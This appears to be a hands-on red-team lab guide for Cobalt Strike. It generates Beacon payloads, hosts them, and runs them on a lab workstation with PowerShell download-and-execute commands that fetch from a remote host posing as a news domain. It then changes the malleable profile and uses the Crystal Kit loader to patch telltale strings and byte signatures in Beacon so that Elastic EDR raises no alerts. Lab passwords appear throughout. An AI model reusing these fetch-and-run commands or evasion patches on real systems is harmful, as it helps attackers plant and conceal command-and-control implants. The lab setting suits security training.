# Default Loader

First, we're going to run a vanilla Beacon payload on the target and see how the EDR complains.

1. Launch Cobalt Strike and connect to the Team Server.
    
2. Generate a stageless executable payload
    
    1. **Payloads > Windows Stageless Payload**.
    2. Select the HTTP listener.
    3. Click **Generate**.
    4. Save to _C:\Payloads\beacon_x64_default.exe_.
3. Host the payload on the Team Server's web server.
    
    1. **Site Management > Host File**.
    2. File: C:\Payloads\beacon_x64_default.exe
    3. Local URI: /beacon_x64_default.exe
4. Switch to [Workstation 1](https://labclient.labondemand.com/Instructions/403ea04f-bff9-4051-9286-3804825cdf8e#) and login with Passw0rd!.
    
5. Open a Terminal window
    
6. Run the following command to download and run the payload.

```
iwr -Uri "http://www.bleepincomputer.com/beacon_x64_default.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64_default.exe" Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64_default.exe"
```
    
> After several moments, you should see notifications popup on the desktop.
    
7. Open Edge and browse to https://10.10.120.200:5601.
    
8. Login using elastic as both the username and password.
    
9. From the menu on the left, click **Alerts** under the **Security** heading.
    
    ![elastic-menu.png](https://labondemand.blob.core.windows.net/content/lab216724/instructions310371/elastic-menu.png)
    
10. Analyse the alerts.
    
    > You should see several, including:
    > 
    > 1. Unbacked Shellcode from Unsigned Module
    > 2. Execution from Suspicious Stack Trailing Bytes
    > 3. Network Module Loaded from Suspicious Unbacked Memory
    
11. Select all the alerts and mark them as closed.
    
    ![close-alerts.png](https://labondemand.blob.core.windows.net/content/lab216724/instructions310371/close-alerts.png)
    
1. Switch back to the [Attacker Desktop](https://labclient.labondemand.com/Instructions/403ea04f-bff9-4051-9286-3804825cdf8e#).

# Configure profile

Crystal Kit is designed to replace Cobalt Strike's out-of-the-box evasion features, so we need to turn those off first.

1. From the Windows taskbar, open a Terminal window.
    
2. SSH into the Team Server VM.
    
    1. ssh attacker@10.0.0.5
    2. The password is Passw0rd!.
3. Open the default profile.
    
    1. nano /opt/cobaltstrike/profiles/default.profile
4. Paste the following stage block:
    
```
stage {
    set sleep_mask "false";
    set cleanup "true";
    transform-obfuscate { }
}
```
    
5. Save the changes.
    
    > **Ctrl+O** & **Ctrl+X**.
    
6. Restart the Docket container.
    
    1. sudo /usr/bin/docker restart cobalt

# Crystal Loader

1. Launch VSCode.
    
    1. Go to **File > Open Folder**
    2. Select _C:\Tools\Crystal-Kit_
2. Open _udrl/loader.spec_.
    
    2. Uncomment each _attach_ and _preserve_ command.
    3. Save changes.
3. Open _crystalkit.cna_.
    
    1. Inside the **BEACON_RDLL_GENERATE** hook, insert the following code after the "x86 warning":
```
# replace some common strings
$beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
$beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
$beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
$beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
```
    1. Save changes.
4. Go back to Cobalt Strike and reload _crystalkit.cna_.
    
5. Generate a stageless executable payload
    
    1. **Payloads > Windows Stageless Payload**.
    2. Select the HTTP listener.
    3. Click **Generate**.
    4. Save to _C:\Payloads\beacon_x64_ck.exe_.
6. Host the payload on the Team Server's web server.
    
    1. **Site Management > Host File**.
    2. File: C:\Payloads\beacon_x64_ck.exe
    3. Local URI: /beacon_x64_ck.exe
7. Switch to [Workstation 1](https://labclient.labondemand.com/Instructions/403ea04f-bff9-4051-9286-3804825cdf8e#) and test it.
```
iwr -Uri "http://www.bleepincomputer.com/beacon_x64_ck.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64_ck.exe"
Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64_ck.exe"
```
    
> Fingers crossed, you'll have no EDR alerts this time 🤞🏻
